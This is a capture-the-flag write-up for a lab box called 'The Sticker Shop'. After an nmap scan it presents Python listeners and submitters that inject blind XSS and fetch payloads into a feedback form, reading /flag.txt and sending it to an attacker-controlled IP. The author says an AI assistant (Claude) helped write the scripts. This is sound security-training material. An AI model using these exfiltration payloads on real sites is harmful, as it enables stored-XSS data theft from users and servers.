# The Sticker Shop

As usual our first step of nmap

`nmap -A -vv -T4 10.10.142.80`


```
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZ5yrbM4EUF9kvSfSmVTdRWGVeqTTpQpwFopgW7iFN3f/I3mBWiJpAGL8Q8rEs7n8ESeN0yRcr1lGSuUtRqk5Mwei9edFIAGFC0uEJMnO7EQl/3O8PAlTGeuIaEg+YItzpmXOIWfslh0oftoQNN0iWouJFj7DU5QtoiuwK9GIDwD54aaJ6QQHu16nYYk0fTmA2szzSy0nL0fG1I+ILOnVf1SEyDu5a+uHSKA4lERXWsJ6KDhEtxAuf1+uk8x33I4ERJQsGEZ/GbFJsPxbWhFgyvRE9cScm+YpeppPBMwbvicnEg+MZLuDfXAzYCsDvXPem8io/8QlqHXAyTb/hfw8twUiLuWRHPuHH6E4tq+cztlD/BsfydBn+72TEB7dZnRnWP4tAnI5au2KiPA1RA3ud3JNn7Ha7iU0AA5MK9gKhSv/S5tDyLhFbAcLm8ByWzdJ1R5F8NIlWG8C9VDgDuixmIQwsV4D7FthMTsDaM5PuJHr5GDOfT56Mn3fGxQT2W4k=
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKVWb4NfXmP4f5RQIvXlrggi/9cDARgYazfJpJFlRhH/Ypg/QO6JQ0cj+BInTq4qjv9q5f1ksX0KLJxT2sc95WI=
|   256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQ5WIN3vZO9KIDXb+PpV5yqA3SVieIqn8jSOGdjDHm1
8080/tcp open  http-proxy syn-ack Werkzeug/3.0.1 Python/3.8.10
```

Things I tried and failed:
- gobuster didn't give out anything useful
- burpsuite to catch respone and modify responses, nothing useful again
- Explored exploits for Werkzeug/3.0.1

Now moving forward

![image](https://github.com/user-attachments/assets/f760fc79-f18c-41b9-987b-e965837d72ac)

we see a feedback menu

![image](https://github.com/user-attachments/assets/b8def8e9-5e5d-4366-9a45-96ee2754bae8)

I tried things using burpsuite, I tried some reflected xss but it won't work because we don't have access to the feedbacks' backend
Therefore blind xss or ssrf is the way

I took help of Claude and made two scripts

```receiver.py
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class FlagReceiver(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle incoming GET requests containing the flag"""
        # Parse the URL and query parameters
        query_components = parse_qs(urlparse(self.path).query)
        
        # Send response headers
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Log the received data
        print("Received data:", query_components)
        
        # Send a response
        self.wfile.write(b"Received")

def start_server(port=8000):
    """Start the receiving server"""
    server_address = ('', port)
    httpd = HTTPServer(server_address, FlagReceiver)
    print(f"Starting server on port {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    start_server()
```
```ssrf_script.py
import requests

def prepare_payload():
    """
    Creates an HTML/JavaScript payload that fetches internal flag and sends it to our server
    """
    # Payload that will run on the target server
    payload = """
    <script>
    fetch('http://10.10.59.19:8080/flag.txt')
        .then(response => response.text())
        .then(data => {
            // Send the flag to our listening server
            fetch('http://10.21.39.45:8000/receive_flag?' + encodeURIComponent(data));
        });
    </script>
    """
    return payload

def send_feedback():
    """
    Submits the payload to the feedback endpoint
    """
    target_url = "http://10.10.59.19:8080/submit_feedback"
    payload = prepare_payload()
    
    # Submit the payload as feedback
    response = requests.post(
        target_url,
        data={"feedback": payload},
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    return response.status_code

if __name__ == "__main__":
    status = send_feedback()
    print(f"Payload submitted with status code: {status}")
```

or using blind XSS

```xss_receiver.py
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import time

class XSSCallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle incoming callbacks from the XSS payload"""
        parsed_path = urlparse(self.path)
        
        # Log the full request
        current_time = time.strftime('%H:%M:%S')
        print(f"\n[{current_time}] Received callback!")
        
        if 'flag' in parsed_path.path:
            # Extract and decode flag data
            query = parse_qs(parsed_path.query)
            if query:
                print("🚩 Flag captured:")
                print(query.get('', ['No data received'])[0])
        elif 'error' in parsed_path.path:
            print("❌ Error received from payload")
            
        # Send response
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")

def start_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, XSSCallbackHandler)
    print(f"Starting XSS callback receiver on port {port}...")
    print("Waiting for callbacks...")
    httpd.serve_forever()

if __name__ == "__main__":
    start_server()
```

```blind-xss-script.py
import requests
import sys

def prepare_blind_xss_payload():
    """
    Creates a blind XSS payload that reads and exfiltrates the flag content
    """
    # Using XMLHttpRequest for broader compatibility
    payload = """
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/flag.txt', true);
    xhr.onload = function() {
        // Send flag data to our server
        var exfil = new XMLHttpRequest();
        exfil.open('GET', 'http://10.21.39.45:8000/flag?' + encodeURIComponent(this.responseText), true);
        exfil.send();
    };
    xhr.onerror = function() {
        // Send error notification
        var error = new XMLHttpRequest();
        error.open('GET', 'http://10.21.39.45:8000/error?failed_to_read_flag', true);
        error.send();
    };
    xhr.send();
    </script>
    """
    return payload

def send_payload():
    """
    Submits the blind XSS payload to the feedback endpoint
    """
    target_url = "http://10.10.59.19:8080/submit_feedback"
    payload = prepare_blind_xss_payload()
    
    try:
        response = requests.post(
            target_url,
            data={"feedback": payload},
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            timeout=10
        )
        return response.status_code
    except requests.exceptions.ConnectionError:
        print(f"Failed to connect to {target_url}")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    print("Sending blind XSS payload...")
    status = send_payload()
    print(f"Payload sent. Status code: {status}")
    print(f"Now listening for callbacks on your server at http://10.21.39.45:8000")
```

`python3 <receiver script>`

`python3 <payload script>`

on different terminals

![image](https://github.com/user-attachments/assets/be28cd36-a1e9-4957-ba43-bbd3d2ca2d2c)

yes flag




